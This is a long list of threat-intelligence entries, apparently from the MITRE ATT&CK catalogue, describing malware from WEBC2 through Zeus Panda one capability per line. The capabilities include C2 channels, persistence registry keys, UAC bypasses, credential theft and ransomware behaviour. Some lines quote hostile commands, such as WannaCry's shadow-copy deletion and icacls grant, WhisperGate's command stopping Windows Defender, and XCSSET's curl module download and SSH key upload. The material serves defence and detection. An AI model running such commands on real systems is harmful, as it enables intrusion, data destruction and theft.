Variants of WEBC2 achieve persistence by using DLL search order hijacking, usually by copying the DLL file to &lt;code&gt;%SYSTEMROOT%&lt;/code&gt; (&lt;code&gt;C:\WINDOWS\ntshrui.dll&lt;/code&gt;).
WEBC2 can download and execute a file.
WEBC2 can open an interactive command shell.
WINDSHIELD is capable of file deletion along with other file system interaction.
WINDSHIELD C2 traffic can communicate via TCP raw sockets.
WINDSHIELD can gather Registry values.
WINDSHIELD can gather the victim computer name.
WINDSHIELD can gather the victim user name.
WINERACK can enumerate active windows.
WINERACK can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.
WINERACK can enumerate files and directories.
WINERACK can enumerate processes.
WINERACK can gather information about the host.
WINERACK can gather information on the victim username.
WINERACK can enumerate services.
WIREFIRE can modify the `visits.py` component of Ivanti Connect Secure VPNs for file download and arbitrary command execution.
WIREFIRE can decode, decrypt, and decompress data received in C2 HTTP `POST` requests.
WIREFIRE has the ability to download files to compromised devices.
WIREFIRE can Base64 encode process output sent to C2.
WIREFIRE can AES encrypt process output sent from compromised devices to C2.
WIREFIRE can respond to specific HTTP `POST` requests to `/api/v1/cav/client/visits`.
WIREFIRE is a web shell that can download files to and execute arbitrary commands from compromised Ivanti Connect Secure VPNs.
WannaCry uses Tor for command and control traffic and routes a custom cryptographic protocol over the Tor circuit.
WannaCry encrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files.
WannaCry uses an exploit in SMBv1 to spread itself to other remote systems on a network.
WannaCry searches for variety of user files by file extension before encrypting them using RSA and AES, including Office, PDF, image, audio, video, source code, archive/compression format, and key and certificate files.
WannaCry uses &lt;code&gt;attrib +h&lt;/code&gt; to make some of its files hidden.
WannaCry uses &lt;code&gt;vssadmin&lt;/code&gt;, &lt;code&gt;wbadmin&lt;/code&gt;, &lt;code&gt;bcdedit&lt;/code&gt;, and &lt;code&gt;wmic&lt;/code&gt; to delete and disable operating system recovery features.
WannaCry attempts to copy itself to remote computers after gaining access via an SMB exploit.
WannaCry uses Tor for command and control traffic.
WannaCry contains a thread that will attempt to scan for new attached drives every few seconds. If one is identified, it will encrypt the files on the attached device.
WannaCry enumerates current remote desktop sessions and tries to execute the malware on each session.
WannaCry scans its local network segment for remote systems to try to exploit and copy itself to.
WannaCry attempts to kill processes associated with Exchange, Microsoft SQL Server, and MySQL to make it possible to encrypt their data stores.
WannaCry will attempt to determine the local network segment it is a part of.
WannaCry uses &lt;code&gt;attrib +h&lt;/code&gt; and &lt;code&gt;icacls . /grant Everyone:F /T /C /Q&lt;/code&gt; to make some of its files hidden and grant all users full access controls.
WannaCry utilizes &lt;code&gt;wmic&lt;/code&gt; to delete shadow copies.
WannaCry creates the service "mssecsvc2.0" with the display name "Microsoft Security Center (2.0) Service."
WarzoneRAT can use `sdclt.exe` to bypass UAC in Windows 10 to escalate privileges; for older Windows versions WarzoneRAT can use the IFileOperation exploit to bypass the UAC module.
WarzoneRAT  can perform COM hijacking by setting the path to itself to the `HKCU\Software\Classes\Folder\shell\open\command` key with a `DelegateExecute` parameter.
WarzoneRAT has the capability to grab passwords from numerous web browsers as well as from Outlook and Thunderbird email clients.
WarzoneRAT can collect data from a compromised host.
WarzoneRAT can use XOR 0x45 to decrypt obfuscated code.
WarzoneRAT can disarm Windows Defender during the UAC process to evade detection.
WarzoneRAT can send collected victim data to its C2 server.
WarzoneRAT can enumerate directories on a compromise host.
WarzoneRAT has the ability of performing remote desktop access via a hVNC window for decreased visibility.
WarzoneRAT can masquerade the Process Environment Block on a compromised host to hide it's attempts to elevate privileges through `IFileOperation`.
WarzoneRAT can download and execute additional files.
WarzoneRAT has the capability to install a live and offline keylogger, including through the use of the `GetAsyncKeyState` Windows API.
WarzoneRAT has relied on a victim to open a malicious attachment within an email for execution.
WarzoneRAT can create `HKCU\Software\Classes\Folder\shell\open\command` as a new registry key during privilege escalation.
WarzoneRAT can use a variety of API calls on a compromised host.
WarzoneRAT can communicate with its C2 server via TCP over port 5200.
WarzoneRAT can use PowerShell to download files and execute commands.
WarzoneRAT can obtain a list of processes on a compromised host.
WarzoneRAT has the ability to inject malicious DLLs into a specific process for privilege escalation.
WarzoneRAT has the capability to act as a reverse proxy.
WarzoneRAT can add itself to the `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` and `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK` Registry keys.
WarzoneRAT has the ability to control an infected PC using RDP.
WarzoneRAT can include a rootkit to hide processes, files, and startup.
WarzoneRAT has been distributed as a malicious attachment within an email.
WarzoneRAT can encrypt its C2 with RC4 with the password `warzone160\x00`.
WarzoneRAT can collect compromised host information, including OS version, PC name, RAM size, and CPU details.
WarzoneRAT has been install via template injection through a malicious DLL embedded within a template RTF in a Word document.
WarzoneRAT has the ability of performing remote desktop access via a VNC console.
WarzoneRAT can access the webcam on a victim's machine.
WarzoneRAT can use `cmd.exe` to execute malicious code.
WastedLocker contains junk code to increase its entropy and hide the actual code.
WastedLocker can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later.
WastedLocker has performed DLL hijacking before execution.
WastedLocker can encrypt data and leave a ransom note.
WastedLocker's custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.
The WastedLocker payload includes encrypted strings stored within the .bss section of the binary file.
WastedLocker can enumerate files and directories just prior to encryption.
WastedLocker has copied a random file from the Windows System32 folder to the &lt;code&gt;%APPDATA%&lt;/code&gt; location under a different hidden filename.
WastedLocker can delete shadow volumes.
WastedLocker can modify registry values within the &lt;code&gt;Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap&lt;/code&gt; registry key.
WastedLocker has the ability to save and execute files as an alternate data stream (ADS).
WastedLocker's custom crypter, CryptOne, leveraged the VirtualAlloc() API function to help execute the payload.
WastedLocker can identify network adjacent and accessible drives.
WastedLocker can enumerate removable drives prior to the encryption process.
WastedLocker checks for specific registry keys related to the &lt;code&gt;UCOMIEnumConnections&lt;/code&gt; and &lt;code&gt;IActiveScriptParseProcedure32&lt;/code&gt; interfaces.
WastedLocker can execute itself as a service.
WastedLocker checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.
WastedLocker has used cmd to execute commands on the system.
WastedLocker has a command to take ownership of a file and reset the ACL permissions using the &lt;code&gt;takeown.exe /F filepath&lt;/code&gt; command.
WastedLocker created and established a service that runs until the encryption process is complete.
Waterbear has used DLL side loading to import and load a malicious DLL loader.
Waterbear has the ability to decrypt its RC4 encrypted payload for execution.
Waterbear has used RC4 encrypted shellcode and encrypted functions.
Waterbear can hook the &lt;code&gt;ZwOpenProcess&lt;/code&gt; and &lt;code&gt;GetExtendedTcpTable&lt;/code&gt; APIs called by the process of a security product to hide PIDs and TCP records from detection.
Waterbear can scramble functions not to be executed again with random values.
Waterbear can receive and load executables from remote C2 servers.
Waterbear has deleted certain values from the Registry to load a malicious DLL.
Waterbear can leverage API functions for execution.
Waterbear can identify the process for a specific security product.
Waterbear can inject decrypted shellcode into the LanmanServer service.
Waterbear can query the Registry key &lt;code&gt;"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI"&lt;/code&gt; to see if the value `OracleOcilib` exists.
Waterbear can find the presence of a specific security software.
Waterbear can use API hooks on `GetExtendedTcpTable` to retrieve a table containing a list of TCP endpoints available to the application.
Waterbear can use thread injection to inject shellcode into the process of security software.
WellMail can archive files on the compromised host.
WellMail can use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS.
WellMail can exfiltrate files from the victim machine.
WellMail can decompress scripts received from C2.
WellMail can receive data and executable scripts from C2.
WellMail can use TCP for C2 communications.
WellMail has been observed using TCP port 25, without using SMTP, to leverage an open port for secure command and control communications.
WellMail can identify the IP address of the victim system.
WellMail can identify the current username on the victim system.
WellMess can communicate to C2 with mutual TLS where client and server mutually check certificates.
WellMess has the ability to use DNS tunneling for C2 communications.
WellMess can send files from the victim machine to C2.
WellMess can decode and decrypt data received from C2.
WellMess can identify domain group membership for the current user.
WellMess can write files to a compromised host.
WellMess can use junk data in the Base64 string for additional obfuscation.
WellMess can execute PowerShell scripts received from C2.
WellMess has used Base64 encoding to uniquely identify communication to and from the C2.
WellMess can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.
WellMess can identify the computer name of a compromised host.
WellMess can identify the IP address and user domain on the target machine.
WellMess can collect the username on the victim machine to send to C2.
WellMess can use HTTP and HTTPS in C2 communications.
WellMess can execute command line scripts received from C2.
Wevtutil can be used to clear system and security event logs from the system.
Wevtutil can be used to export events from a specific log.
Wevtutil can be used to disable specific event logs on the system.
WhisperGate overwrites the MBR with a bootloader component that performs destructive wiping operations on hard drives and displays a fake ransom note when the host boots.
The WhisperGate third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via `%TEMP%\AdvancedRun.exe" /EXEFilename "C:\Windows\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run`.
WhisperGate can corrupt files by overwriting the first 1 MB with `0xcc` and appending random extensions.
WhisperGate can deobfuscate downloaded files stored in reverse byte order and decrypt embedded resources using multiple XOR operations.
WhisperGate can download and execute AdvancedRun.exe to disable the Windows Defender Theat Protection service and set an exclusion path for the C:\ drive.
WhisperGate can overwrite sectors of a victim host's hard drive at periodic offsets.
WhisperGate can overwrite the Master Book Record (MBR) on victim systems with a malicious 16-bit bootloader.
WhisperGate can Base64 encode strings, store downloaded files in reverse byte order,  and use the Eazfuscator tool to obfuscate its third stage.
WhisperGate can delete tools from a compromised host after execution.
WhisperGate can locate files based on hardcoded file extensions.
WhisperGate can download additional stages of malware from a Discord CDN channel.
WhisperGate has used `InstallUtil.exe` as part of its process to disable Windows Defender.
WhisperGate has been disguised as a JPG extension to avoid detection as a malicious PE file.
WhisperGate has used the `ExitWindowsEx` to flush file buffers to disk and stop running processes and other API calls.
WhisperGate can enumerate connected remote logical drives.
WhisperGate can use PowerShell to support multiple actions including execution and defense evasion.
WhisperGate has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility `InstallUtil.exe`.
WhisperGate's downloader can reverse its third stage file bytes and reflectively load the file as a .NET assembly.
WhisperGate can recognize the presence of monitoring tools on a target system.
WhisperGate can download and execute AdvancedRun.exe via `sc.exe`.
WhisperGate can stop its execution when it recognizes the presence of certain monitoring tools.
WhisperGate has the ability to enumerate fixed logical drives on a targeted system.
WhisperGate can shutdown a compromised host through execution of `ExitWindowsEx` with the `EXW_SHUTDOWN` flag.
WhisperGate can pause for 20 seconds to bypass antivirus solutions.
WhisperGate can use a Visual Basic script to exclude the `C:\` drive from Windows Defender.
WhisperGate can make an HTTPS connection to download additional files.
WhisperGate can download additional payloads hosted on a Discord channel.
WhisperGate can use `cmd.exe` to execute commands.
Wiarp creates a backdoor through which remote attackers can download files.
Wiarp creates a backdoor through which remote attackers can inject files into running processes.
Wiarp creates a backdoor through which remote attackers can open a command line interface.
Wiarp creates a backdoor through which remote attackers can create a service.
WinMM is usually configured with primary and backup domains for C2 communications.
WinMM sets a WH_CBT Windows hook to search for and capture files on the victim.
WinMM sets a WH_CBT Windows hook to collect information on process creation.
WinMM collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.
WinMM uses NetUser-GetInfo to identify that it is running under an “Admin” account on the local system.
WinMM uses HTTP for C2.
WindTail has the ability to use the macOS built-in zip utility to archive files.
WindTail can identify and add files that possess specific file extensions to an array for archiving.
WindTail has the ability to decrypt strings using hard-coded AES keys.
WindTail can be delivered as a compressed, encrypted, and encoded payload.
WindTail has the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl.
WindTail has the ability to receive and execute a self-delete command.
WindTail has the ability to enumerate the users home directory and the path to its own application bundle.
WindTail can instruct the OS to execute an application without a dock icon or menu.
WindTail has been incompletely signed with revoked certificates.
WindTail has used icons mimicking MS Office files to mask payloads.
WindTail can invoke Apple APIs &lt;code&gt;contentsOfDirectoryAtPath&lt;/code&gt;, &lt;code&gt;pathExtension&lt;/code&gt;, and (string) &lt;code&gt;compare&lt;/code&gt;.
WindTail has the ability to generate the current date and time.
WindTail can use the &lt;code&gt;open&lt;/code&gt; command to execute an application.
WindTail has the ability to use HTTP for C2 communications.
Windows Credential Editor can dump credentials.
Winexe installs a service on the remote system, executes the command, then uninstalls the service.
Wingbird side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.
Wingbird exploits CVE-2016-4117 to allow an executable to gain escalated privileges.
Wingbird deletes its payload along with the payload's parent process after it finishes copying files.
Wingbird drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.
Wingbird performs multiple process injections to hijack system processes and execute malicious code.
Wingbird checks for the presence of Bitdefender security software.
Wingbird uses services.exe to register a new autostart service named "Audit Service" using a copy of the local lsass.exe file.
Wingbird checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.
Wingbird uses services.exe to register a new autostart service named "Audit Service" using a copy of the local lsass.exe file.
Winnti for Linux has decoded XOR encoded strings holding its configuration upon execution.
Winnti for Linux can encode its configuration file with single-byte XOR encoding.
Winnti for Linux has the ability to deploy modules directly from command and control (C2) servers, possibly for remote command execution, file exfiltration, and socks5 proxying on the infected host.
Winnti for Linux has used ICMP, custom TCP, and UDP in outbound communications.
Winnti for Linux has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity.
Winnti for Linux has used a custom TCP protocol with four-byte XOR for command and control (C2).
Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism.
Winnti for Linux has used HTTP in outbound communications.
Winnti for Windows can use a variant of the sysprep UAC bypass.
The Winnti for Windows dropper can decrypt and decompresses a data blob.
Winnti for Windows has the ability to encrypt and compress its payload.
The Winnti for Windows dropper component can verify the existence of a single command line parameter and either terminate if it is not found or later use it as a decryption key.
The Winnti for Windows HTTP/S C2 mode can make use of an external proxy.
Winnti for Windows can delete the DLLs for its various components from a compromised host.
Winnti for Windows can check for the presence of specific files prior to moving to the next phase of execution.
The Winnti for Windows dropper can place malicious payloads on targeted systems.
The Winnti for Windows HTTP/S C2 mode can make use of a local proxy.
A Winnti for Windows implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.
Winnti for Windows can use Native API to create a new process and to start services.
Winnti for Windows can communicate using custom TCP.
Winnti for Windows can check if the explorer.exe process is responsible for calling its install function.
Winnti for Windows can add a service named &lt;code&gt;wind0ws&lt;/code&gt; to the Registry to achieve persistence after reboot.
The Winnti for Windows installer loads a DLL using rundll32.
Winnti for Windows can run as a service using svchost.exe.
Winnti for Windows can XOR encrypt C2 traffic.
Winnti for Windows can determine if the OS on a compromised host is newer than Windows XP.
Winnti for Windows can set the timestamps for its worker and service components to match that of cmd.exe.
Winnti for Windows has the ability to use encapsulated HTTP/S in C2 communications.
Winnti for Windows sets its DLL file as a new service in the Registry to establish persistence.
It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the Wiper malware.
Woody RAT can identify administrator accounts on an infected machine.
Woody RAT can use RSA-4096 to encrypt data sent to its C2 server.
Woody RAT can collect information from a compromised host.
Woody RAT can deobfuscate Base64-encoded strings and scripts.
Woody RAT has used Base64 encoded strings and scripts.
Woody RAT can exfiltrate files from an infected machine to its C2 server.
Woody RAT has relied on CVE-2022-30190 (Follina) for execution during delivery.
Woody RAT has the ability to delete itself from disk by creating a suspended notepad process and writing shellcode to delete a file into the suspended process using `NtWriteVirtualMemory`.
Woody RAT can list all files and their associated attributes, including filename, type, owner, creation time, last access time, last write time, size, and permissions.
Woody RAT has suppressed all error reporting by calling `SetErrorMode` with 0x8007 as a parameter.
Woody RAT can download files from its C2 server, including the .NET DLLs, `WoodySharpExecutor` and `WoodyPowerSession`.
Woody RAT can make `Ping` GET HTTP requests to its C2 server at regular intervals for network connectivity checks.
Woody RAT has relied on users opening a malicious email attachment for execution.
Woody RAT can use multiple native APIs, including `WriteProcessMemory`, `CreateProcess`, and `CreateRemoteThread` for process injection.
Woody RAT can execute PowerShell commands and scripts with the use of .NET DLL, `WoodyPowerSession`.
Woody RAT can call `NtQuerySystemProcessInformation` with `SystemProcessInformation` to enumerate all running processes, including associated information such as PID, parent PID, image name, and owner.
Woody RAT can create a suspended notepad process and write shellcode to delete a file into the suspended process using `NtWriteVirtualMemory`.
Woody RAT can inject code into a targeted process by writing to the remote memory of an infected system and then create a remote thread.
Woody RAT can search registry keys to identify antivirus programs on an compromised host.
Woody RAT has the ability to take a screenshot of the infected host desktop using Windows GDI+.
Woody RAT can detect Avast Software, Doctor Web, Kaspersky, AVG, ESET, and Sophos antivirus programs.
Woody RAT can collect .NET, PowerShell, and Python information from an infected host.
Woody RAT has been delivered via malicious Word documents and archive files.
Woody RAT can use AES-CBC to encrypt data sent to its C2 server.
Woody RAT can retrieve the following information from an infected machine: OS, architecture, computer name, OS build version, environment variables, and storage drives.
Woody RAT can retrieve network interface and proxy information.
Woody RAT can retrieve a list of user accounts and usernames from an infected machine.
Woody RAT can communicate with its C2 server using HTTP requests.
Woody RAT can execute commands using `cmd.exe`.
XAgentOSX contains the getFirefoxPassword function to attempt to locate Firefox passwords.
XAgentOSX contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.
XAgentOSX contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.
XAgentOSX contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory. XAgentOSX contains the showBackupIosFolder function to check for IOS device backups by running &lt;code&gt;ls -la ~/Library/Application\ Support/MobileSync/Backup/&lt;/code&gt;.
XAgentOSX contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.
XAgentOSX contains the execFile function to execute a specified file on the system using the NSTask:launch method.
XAgentOSX contains the getProcessList function to run &lt;code&gt;ps aux&lt;/code&gt; to get running processes.
XAgentOSX contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.
XAgentOSX contains the getInstalledAPP function to run &lt;code&gt;ls -la /Applications&lt;/code&gt; to gather what applications are installed.
XAgentOSX contains the getInfoOSX function to return the OS X version as well as the current user.
XCSSET attempts to discover accounts from various locations such as a user's Evernote, AppleID, Telegram, Skype, and WeChat data.
XCSSET will compress entire &lt;code&gt;~/Desktop&lt;/code&gt; folders excluding all &lt;code&gt;.git&lt;/code&gt; folders, but only if the total data size is under 200MB.
XCSSET uses a malicious browser application to replace the legitimate browser in order to continuously capture credentials, monitor web traffic, and download additional modules.
XCSSET adds malicious code to a host's Xcode projects by enumerating CocoaPods &lt;code&gt;target_integrator.rb&lt;/code&gt; files under the &lt;code&gt;/Library/Ruby/Gems&lt;/code&gt; folder or enumerates all &lt;code&gt;.xcodeproj&lt;/code&gt; folders under a given directory. XCSSET then downloads a script and Mach-O file into the Xcode project folder.
XCSSET performs AES-CBC encryption on files under &lt;code&gt;~/Documents&lt;/code&gt;, &lt;code&gt;~/Downloads&lt;/code&gt;, and
&lt;code&gt;~/Desktop&lt;/code&gt; with a fixed key and renames files to give them a &lt;code&gt;.enc&lt;/code&gt; extension. Only files with sizes 
less than 500MB are encrypted.
XCSSET collects contacts and application data from files in Desktop, Documents, Downloads, Dropbox, and WeChat folders.
XCSSET adds malicious file paths to the &lt;code&gt;DYLD_FRAMEWORK_PATH&lt;/code&gt; and &lt;code&gt;DYLD_LIBRARY_PATH&lt;/code&gt; environment variables to execute malicious code.
XCSSET exfiltrates data stolen from a system over its C2 channel.
XCSSET has used a zero-day exploit in the ssh launchdaemon to elevate privileges and bypass SIP.
XCSSET has used `mdfind` to enumerate a list of apps known to grant screen sharing permissions.
XCSSET prompts the user to input credentials using a native macOS dialog box leveraging the system process &lt;code&gt;/Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment&lt;/code&gt;.
XCSSET has dropped a malicious applet into an app's `.../Contents/MacOS/` folder of a previously launched app to bypass Gatekeeper's security checks on first launch apps (prior to macOS 13).
XCSSET uses a hidden folder named &lt;code&gt;.xcassets&lt;/code&gt; and &lt;code&gt;.git&lt;/code&gt; to embed itself in Xcode.
XCSSET downloads browser specific AppleScript modules using a constructed URL with the &lt;code&gt;curl&lt;/code&gt; command, &lt;code&gt;https://" &amp; domain &amp; "/agent/scripts/" &amp; moduleName &amp; ".applescript&lt;/code&gt;.
XCSSET uses the ssh launchdaemon to elevate privileges, bypass system controls, and enable remote access to the victim.
XCSSET loads a system level launchdaemon using the &lt;code&gt;launchctl load -w&lt;/code&gt; command from &lt;code&gt;/System/Librarby/LaunchDaemons/ssh.plist&lt;/code&gt;.
XCSSET uses the &lt;code&gt;chmod +x&lt;/code&gt; command to grant executable permissions to the malicious file.
XCSSET builds a malicious application bundle to resemble Safari through using the Safari icon and &lt;code&gt;Info.plist&lt;/code&gt;.
XCSSET uses the &lt;code&gt;plutil&lt;/code&gt; command to modify the &lt;code&gt;LSUIElement&lt;/code&gt;, &lt;code&gt;DFBundleDisplayName&lt;/code&gt;, and &lt;code&gt;CFBundleIdentifier&lt;/code&gt; keys in the &lt;code&gt;/Contents/Info.plist&lt;/code&gt; file to change how XCSSET is visible on the system.
XCSSET will create an ssh key if necessary with the &lt;code&gt;ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P&lt;/code&gt; command. XCSSET will upload a private key file to the server to remotely access the host without a password.
XCSSET saves a screen capture of the victim's system with a numbered filename and &lt;code&gt;.jpg&lt;/code&gt; extension. Screen captures are taken at specified intervals based on the system.
XCSSET searches firewall configuration files located in &lt;code&gt;/Library/Preferences/&lt;/code&gt; and uses &lt;code&gt;csrutil status&lt;/code&gt; to determine if System Integrity Protection is enabled.
XCSSET uses &lt;code&gt;ps aux&lt;/code&gt; with the &lt;code&gt;grep&lt;/code&gt; command to enumerate common browsers and system processes potentially impacting XCSSET's exfiltration capabilities.
XCSSET uses &lt;code&gt;scp&lt;/code&gt; to access the &lt;code&gt;~/Library/Cookies/Cookies.binarycookies&lt;/code&gt; file.
XCSSET uses RC4 encryption over TCP to communicate with its C2 server.
XCSSET identifies the macOS version and uses &lt;code&gt;ioreg&lt;/code&gt; to determine serial number.
XCSSET uses AppleScript to check the host's language and location with the command &lt;code&gt;user locale of (get system info)&lt;/code&gt;.
Using the machine's local time, XCSSET waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file, &lt;code&gt;.report&lt;/code&gt;. After the elapsed time, XCSSET executes additional modules.
XCSSET uses a shell script to execute Mach-o files and &lt;code&gt;osacompile&lt;/code&gt; commands such as, &lt;code&gt;osacompile -x -o xcode.app main.applescript&lt;/code&gt;.
XTunnel uses SSL/TLS and RC4 to encrypt traffic.
A version of XTunnel introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.
XTunnel is capable of accessing locally stored passwords on victims.
The C2 server used by XTunnel provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.
XTunnel is capable of probing the network for open ports.
A version of XTunnel introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.
XTunnel relays traffic between a C2 server and a victim.
XTunnel has been used to execute remote commands.
Xbash can create a cronjob for persistence if it determines it is on a Linux system.
Xbash has destroyed Linux-based databases as part of its ransomware capabilities.
Xbash has maliciously encrypted victim's database systems and demanded a cryptocurrency ransom be paid.
Xbash can obtain a webpage hosted on Pastebin to update its C2 domain list.
Xbash can attempt to exploit known vulnerabilities in Hadoop, Redis, or ActiveMQ when it finds those services running in order to conduct further execution.
Xbash can download additional malicious files from its C2 server.
Xbash can execute malicious JavaScript payloads on the victim’s machine.
Xbash can use mshta for executing scripts.
Xbash can perform port scanning of TCP and UDP ports.
Xbash can obtain a list of weak passwords from the C2 server to use for brute forcing as well as attempt to brute force services with open ports.
Xbash can use scripts to invoke PowerShell to download a malicious PE executable or PE DLL for execution.
Xbash can create a Startup item for persistence if it determines it is on a Windows system.
Xbash can use regsvr32 for executing scripts.
Xbash can collect IP addresses and local intranet information from a victim’s machine.
Xbash can execute malicious VBScript payloads on the victim’s machine.
Xbash uses HTTP for C2 communications.
YAHOYAH decrypts downloaded files before execution.
YAHOYAH encrypts its configuration file using a simple algorithm.
YAHOYAH uses HTTP GET requests to download other files that are executed in memory.
YAHOYAH checks for antimalware solution processes on the system.
YAHOYAH checks for the system’s Windows OS version and hostname.
YAHOYAH uses HTTP for C2.
ZIPLINE can add itself to the exclusion list for the Ivanti Connect Secure Integrity Checker Tool if the `--exclude` parameter is passed by the `tar` process.
ZIPLINE can find and append specific files on Ivanti Connect Secure VPNs based upon received commands.
ZIPLINE can download files to be saved on the compromised system.
ZIPLINE can communicate with C2 using a custom binary protocol.
ZIPLINE can identify running processes and their names.
ZIPLINE can create a proxy server on compromised hosts.
ZIPLINE can use AES-128-CBC to encrypt data for both upload and download.
ZIPLINE can identify a specific string in intercepted network traffic, `SSH-2.0-OpenSSH_0.3xx.`, to trigger its command functionality.
ZIPLINE can use `/bin/sh` to create a reverse shell and execute commands.
The ZLib backdoor compresses communications using the standard Zlib compression library.
ZLib has sent data and files from a compromised host to its C2 servers.
ZLib has the ability to enumerate files and drives.
ZLib has the ability to download files.
ZLib mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.
ZLib has the ability to obtain screenshots of the compromised system.
ZLib has the ability to enumerate system information.
ZLib has the ability to discover and manipulate Windows services.
ZLib communicates over HTTP for C2.
ZLib has the ability to execute shell commands.
ZLib creates Registry keys to allow itself to run as various services.
Zebrocy  has used a method similar to RC4 as well as AES for encryption and hexadecimal for encoding data before exfiltration.
Zebrocy uses SSL and AES ECB for encrypting C2 communications.
Zebrocy scans the system and automatically collects files with the following extensions: .doc, .docx, ,.xls, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .jpeg, .bmp, .tiff, .kum, .tlg, .sbx, .cr, .hse, .hsf, and .lhz.
Zebrocy installs an application-defined Windows hook to get notified when a network drive has been attached, so it can then use the hook to call its RecordToFile file stealing method.
Zebrocy has the capability to upload dumper tools that extract credentials from web browsers and store them in database files.
Zebrocy decodes its secondary payload and writes it to the victim’s machine. Zebrocy also uses AES and XOR to decrypt strings and payloads.
Zebrocy has exfiltrated data to the designated C2 server using HTTP POST requests.
Zebrocy has a command to delete files and directories.
Zebrocy searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar. Zebrocy also runs the &lt;code&gt;echo %APPDATA%&lt;/code&gt; command to list the contents of the directory. Zebrocy can obtain the current execution path as well as perform drive enumeration.
Zebrocy obtains additional code to execute on the victim's machine, including the downloading of a secondary payload.
Zebrocy stores all collected information in a single file before exfiltration.
Zebrocy performs persistence with a logon script via adding to the Registry key &lt;code&gt;HKCU\Environment\UserInitMprLogonScript&lt;/code&gt;.
Zebrocy uses SMTP and POP3 for C2.
Zebrocy identifies network drives when they are added to victim systems.
Zebrocy enumerates information about connected storage devices.
Zebrocy uses the &lt;code&gt;tasklist&lt;/code&gt; and &lt;code&gt;wmic process get Capture, ExecutablePath&lt;/code&gt; commands to gather the processes running on the system.
Zebrocy executes the &lt;code&gt;reg query&lt;/code&gt; command to obtain information in the Registry.
Zebrocy creates an entry in a Registry Run key for the malware to execute on startup.
Zebrocy has a command to create a scheduled task for persistence.
A variant of Zebrocy captures screenshots of the victim’s machine in JPEG and BMP format.
Zebrocy's Delphi variant was packed with UPX.
Zebrocy has used URL/Percent Encoding on data exfiltrated via HTTP POST requests.
Zebrocy collects the OS version, computer name and serial number for the storage volume C:\. Zebrocy also runs the &lt;code&gt;systeminfo&lt;/code&gt; command to gather system information.
Zebrocy runs the &lt;code&gt;ipconfig /all&lt;/code&gt; command.
Zebrocy uses &lt;code&gt;netstat -aon&lt;/code&gt; to gather network connection information.
Zebrocy gets the username from the system.
Zebrocy gathers the current time zone and date information from the system.
Zebrocy uses HTTP for C2.
Zebrocy uses cmd.exe to execute commands on the system.
One variant of Zebrocy uses WMI queries to gather information.
ZeroT has obfuscated DLLs and functions using dummy API calls inserted between real instructions.
Many ZeroT samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.
ZeroT has used DLL side-loading to load malicious payloads.
ZeroT shellcode decrypts and decompresses its RC4-encrypted payload.
ZeroT has encrypted its payload with RC4.
ZeroT can download additional payloads onto the victim.
Some ZeroT DLL files have been packed with UPX.
ZeroT has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.
ZeroT has used RC4 to encrypt C2 traffic.
ZeroT gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.
ZeroT gathers the victim's IP address and domain information, and then sends it to its C2 server.
ZeroT has used HTTP for C2.
ZeroT can add a new service to ensure PlugX persists on the system when delivered as another payload onto the system.
Some variants of the Zeroaccess Trojan have been known to store data in Extended Attributes.
Zeroaccess is a kernel-mode rootkit.
Zeus Panda can hook GetClipboardData function to watch for clipboard pastes to collect.
Zeus Panda obfuscates the macro commands in its initial payload.
Zeus Panda can launch remote scripts on the victim’s machine.
Zeus Panda hooks processes by leveraging its own IAT hooked functions.
Zeus Panda decrypts strings in the code during the execution process.
Zeus Panda encrypts strings with XOR. Zeus Panda also encrypts all configuration and settings in AES and RC4.
Zeus Panda has a command to delete a file. It also can uninstall scripts and delete files to cover its track.
Zeus Panda searches for specific directories on the victim’s machine.
Zeus Panda can download additional malware plug-in modules and execute them on the victim’s machine.
